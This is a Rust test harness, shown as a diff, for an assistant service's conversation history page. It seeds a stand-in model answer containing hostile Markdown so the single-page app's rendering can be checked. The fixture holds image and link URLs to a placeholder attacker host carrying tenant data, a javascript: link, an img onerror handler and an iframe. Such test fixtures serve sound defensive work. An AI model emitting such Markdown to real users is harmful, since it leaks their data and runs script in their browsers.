@@ -1,0 +1,161 @@
+//! One-off end-to-end harness for Laysi/trustiot-v2#1042 (the conversation history and page).
+//! Kept as evidence, not as a test: to rerun it, copy it to
+//! `services/assistant/tests/spa_e2e_1042.rs` and follow the steps in the test report. Serves the
+//! real public conversation API (the assistant binary over a Postgres in a container) for the SPA:
+//! stores two conversations whose answers the real agent got from a stand-in model, one of them
+//! hostile Markdown, writes the API's address and a fresh token of their owner into `E2E_DIR`
+//! until the browser run writes `done`, then reads the conversations back through the API.
+
+#![allow(
+    clippy::print_stderr,
+    dead_code,
+    unused_imports,
+    reason = "one-off harness, not committed"
+)]
+
+mod service;
+mod support;
+
+use std::path::Path;
+use std::sync::Arc;
+use std::time::{Duration, Instant};
+
+use assistant::store;
+use assistant::tools::{NoDelegation, Tool};
+use contract::identity::TenantRole;
+use contract::TenantId;
+use reqwest::Method;
+use serde_json::{Value, json};
+use service::{Service, User};
+use service_kit::tenant::TenantDb;
+use sqlx::postgres::PgPoolOptions;
+use support::{StandIn, ok, respond, settings};
+use testkit::identity::TestIssuer;
+use testkit::product::{DATABASE, product_postgres};
+
+/// The hostile answer: every way a model's Markdown could load or link something.
+const HOSTILE: &str = "Floor 3 used **412 kWh** this week.
+
+![floor plan](https://evil.example.test/leak.png?d=tenant-data)
+![chart](data:image/png;base64,iVBORw0KGgo=)
+![same origin](/static/leak.png?d=tenant-data)
+[the report](https://evil.example.test/report?d=tenant-data) and <https://evil.example.test/auto>
+[run](javascript:alert(1)) [frame](//evil.example.test/x)
+
+<img src=\"https://evil.example.test/raw.png\" onerror=\"alert(1)\">
+<iframe src=\"https://evil.example.test/frame\"></iframe>
+<a href=\"https://evil.example.test/a\">raw link</a>
+
+| Week | kWh |
+| - | -: |
+| This | 412 |
+
+Open [the settings](/settings) or [the dashboards](/dashboards).";
+
+const PLAIN: &str = "All twelve meters on floor 3 reported in the last hour.";
+
+fn answer(text: &str) -> String {
+    json!({
+        "id": "msg_answer",
+        "type": "message",
+        "role": "assistant",
+        "content": [{"type": "text", "text": text}],
+        "model": "claude-opus-5-5",
+        "stop_reason": "end_turn",
+        "usage": {"input_tokens": 400, "output_tokens": 50}
+    })
+    .to_string()
+}
+
+fn write(dir: &Path, name: &str, value: &str) {
+    let temporary = dir.join(format!(".{name}.tmp"));
+    std::fs::write(&temporary, value).expect("write the file");
+    std::fs::rename(&temporary, dir.join(name)).expect("move the file in place");
+}
+
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "one-off harness for the browser run"]
+async fn serve_conversations_for_the_spa() {
+    let dir = std::path::PathBuf::from(std::env::var("E2E_DIR").expect("E2E_DIR"));
+    let product = product_postgres(&["assistant_app", "assistant_platform"])
+        .await
+        .expect("a Postgres container");
+    let issuer = TestIssuer::new();
+    let service = Service::start(&product, &issuer.jwks(), &[]).await;
+    let db = TenantDb::connect_lazy(
+        product.postgres.options("assistant_app", DATABASE),
+        PgPoolOptions::new().max_connections(2),
+    )
+    .expect("the service role's pool");
+    let owner = User::new(TenantId::generate(), TenantRole::Viewer);
+
+    let mut ids = Vec::new();
+    for (question, text) in [
+        ("How did floor 3 use energy this week?", HOSTILE),
+        ("Did every meter on floor 3 report?", PLAIN),
+    ] {
+        let text = text.to_owned();
+        let stand_in = StandIn::start(respond(move |_request, _index| ok(answer(&text)))).await;
+        let tools: Vec<Arc<dyn Tool>> = vec![];
+        let agent = support::agent(&stand_in, tools, settings());
+        let mut conversation = agent.start_conversation(owner.principal(), "");
+        agent
+            .ask(&mut conversation, question, Arc::new(NoDelegation))
+            .await
+            .expect("an answer");
+        let mut tx = db
+            .begin(&owner.identity(&issuer))
+            .await
+            .expect("a tenant transaction");
+        store::create(&mut tx, &conversation)
+            .await
+            .expect("store the conversation");
+        tx.commit().await.expect("commit");
+        ids.push(conversation.id());
+        // The second one is the more recent.
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+    write(&dir, "hostile", &ids[0].to_string());
+    write(&dir, "plain", &ids[1].to_string());
+    write(&dir, "hostile-answer", HOSTILE);
+    write(&dir, "token", &owner.token(&issuer));
+    write(&dir, "api", &service.base_url);
+    eprintln!("API at {}, conversations {ids:?}", service.base_url);
+
+    let deadline = Instant::now() + Duration::from_secs(1800);
+    while Instant::now() < deadline {
+        write(&dir, "token", &owner.token(&issuer));
+        if dir.join("done").exists() {
+            // What the service holds after the browser run, through the same API.
+            let mut state = json!({});
+            for (name, path) in [
+                ("active", "/api/assistant/v1/conversations"),
+                ("archived", "/api/assistant/v1/conversations?archived=true"),
+                ("deleted", "/api/assistant/v1/deleted-conversations"),
+            ] {
+                let reply = service
+                    .as_user(&issuer, &owner, Method::GET, path, None)
+                    .await;
+                reply.expect_status(200);
+                state[name] = reply.json();
+            }
+            for id in &ids {
+                let reply = service
+                    .as_user(
+                        &issuer,
+                        &owner,
+                        Method::GET,
+                        &format!("/api/assistant/v1/conversations/{id}"),
+                        None,
+                    )
+                    .await;
+                state["detail"][id.to_string()] = json!({"status": reply.status, "body": reply.json()});
+            }
+            write(&dir, "final.json", &serde_json::to_string_pretty(&state).expect("JSON"));
+            eprintln!("done");
+            return;
+        }
+        tokio::time::sleep(Duration::from_millis(500)).await;
+    }
+    panic!("the browser run did not write `done` within 30 minutes");
+}
